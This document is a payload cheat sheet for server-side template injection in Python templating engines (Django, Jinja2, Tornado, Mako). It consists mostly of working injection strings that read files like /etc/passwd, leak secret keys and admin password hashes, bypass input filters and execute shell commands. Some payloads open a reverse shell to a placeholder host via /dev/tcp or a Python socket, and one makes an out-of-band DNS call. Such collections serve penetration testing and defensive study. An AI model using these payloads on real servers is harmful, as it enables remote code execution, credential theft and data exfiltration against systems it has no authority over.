# server side template injection - python

> server-side template injection (ssti)  is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. in python, ssti can occur when using templating engines such as jinja2, mako, or django templates, where user input is included in templates without proper sanitization.

## summary

- [templating libraries](#templating-libraries)
- [django](#django)
    - [django - basic injection](#django---basic-injection)
    - [django - cross-site scripting](#django---cross-site-scripting)
    - [django - debug information leak](#django---debug-information-leak)
    - [django - leaking app's secret key](#django---leaking-apps-secret-key)
    - [django - admin site url leak](#django---admin-site-url-leak)
    - [django - admin username and password hash leak](#django---admin-username-and-password-hash-leak)
- [jinja2](#jinja2)
    - [jinja2 - basic injection](#jinja2---basic-injection)
    - [jinja2 - template format](#jinja2---template-format)
    - [jinja2 - debug statement](#jinja2---debug-statement)
    - [jinja2 - dump all used classes](#jinja2---dump-all-used-classes)
    - [jinja2 - dump all config variables](#jinja2---dump-all-config-variables)
    - [jinja2 - read remote file](#jinja2---read-remote-file)
    - [jinja2 - write into remote file](#jinja2---write-into-remote-file)
    - [jinja2 - remote command execution](#jinja2---remote-command-execution)
        - [forcing output on blind rce](#jinja2---forcing-output-on-blind-rce)
        - [exploit the ssti by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
        - [exploit the ssti by calling subprocess.popen](#exploit-the-ssti-by-calling-subprocesspopen)
        - [exploit the ssti by calling popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
        - [exploit the ssti by writing an evil config file](#exploit-the-ssti-by-writing-an-evil-config-file)
    - [jinja2 - filter bypass](#jinja2---filter-bypass)
- [tornado](#tornado)
    - [tornado - basic injection](#tornado---basic-injection)
    - [tornado - remote command execution](#tornado---remote-command-execution)
- [mako](#mako)
    - [mako - remote command execution](#mako---remote-command-execution)
- [references](#references)

## templating libraries

| template name | payload format |
| ------------ | --------- |
| bottle    | `{{ }}`  |
| chameleon | `${ }`   |
| cheetah   | `${ }`   |
| django    | `{{ }}`  |
| jinja2    | `{{ }}`  |
| mako      | `${ }`   |
| pystache  | `{{ }}`  |
| tornado   | `{{ }}`  |

## django

django template language supports 2 rendering engines by default: django templates (dt) and jinja2. django templates is much simpler engine. it does not allow calling of passed object functions and impact of ssti in dt is often less severe than in jinja2.

### django - basic injection

```python
{% csrf_token %} # causes error with jinja2
{{ 7*7 }}  # error with django templates
ih0vr{{364|add:733}}d121r # burp payload -> ih0vr1097d121r
```

### django - cross-site scripting

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### django - debug information leak

```python
{% debug %}
```

### django - leaking app's secret key

```python
{{ messages.storages.0.signer.key }}
```

### django - admin site url leak

```python
{% include 'admin/base.html' %}
```

### django - admin username and password hash leak

```ps1
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

---

## jinja2

[official website](https://jinja.palletsprojects.com/)
> jinja2 is a full featured template engine for python. it has full unicode support, an optional integrated sandboxed execution environment, widely used and bsd licensed.  

### jinja2 - basic injection

```python
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```

jinja2 is used by python web frameworks such as django or flask.
the above injections have been tested on a flask application.

### jinja2 - template format

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

### jinja2 - debug statement

if the debug extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. this is useful to see what’s available to use in the template without setting up a debugger.

```python
<pre>{% debug %}</pre>
```

source: <https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement>

### jinja2 - dump all used classes

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

access `__globals__` and `__builtins__`:

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### jinja2 - dump all config variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### jinja2 - read remote file

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = file class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#l398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### jinja2 - write into remote file

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('hello here !') }}
```

### jinja2 - remote command execution

listen for connection

```bash
nc -lnvp 8000
```

#### jinja2 - forcing output on blind rce

you can import flask functions to return an output from the vulnerable page.

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('powned')
    return r
")
}}
```

#### exploit the ssti by calling os.popen().read()

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

but when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 template object:

```python
{{ self._templatereference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._templatereference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._templatereference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

we can use these shorter payloads:

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

source [@podalirius_](https://twitter.com/podalirius_) : <https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/>

with [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. this is the shortest payload known to achieve rce in a jinja2 template:

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

source: <https://twitter.com/podalirius_/status/1655970628648697860>

#### exploit the ssti by calling subprocess.popen

:warning: the number 396 will vary depending of the application.

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=true,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### exploit the ssti by calling popen without guessing the offset

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.af_inet,socket.sock_stream);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

simply modification of payload to clean up output and facilitate command input (<https://twitter.com/secgus/status/1198976764351066113>)
in another get parameter include a variable named "input" that contains the command you want to run (for example: &input=ls)

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

#### exploit the ssti by writing an evil config file

```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nruncmd = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['runcmd']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=true) }}
```

### jinja2 - filter bypass

```python
request.__class__
request["__class__"]
```

bypassing `_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

bypassing `[` and `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

bypassing `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by <https://twitter.com/secgus>:

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## tornado

### tornado - basic injection

```py
{{7*7}}
{{7*'7'}}
```

### tornado - remote command execution

```py
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

---

## mako

[official website](https://www.makotemplates.org/)
> mako is a template library written in python. conceptually, mako is an embedded python (i.e. python server page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to python calling and scoping semantics.

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### mako - remote command execution

any of these payloads allows direct access to the `os` module

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._nsattr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._nsattr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._nsattr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._nsattr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._nsattr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._nsattr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._nsattr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._nsattr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

poc :

```python
>>> print(template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

## references

- [cheatsheet - flask & jinja2 ssti - phosphore - september 3, 2018](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
- [exploring ssti in flask/jinja2, part ii - tim tomes - march 11, 2016](https://web.archive.org/web/20170710015954/https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
- [jinja2 template injection filter bypasses - sebastian neef - august 28, 2017](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [python context free payloads in mako templates - podalirius - august 26, 2021](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
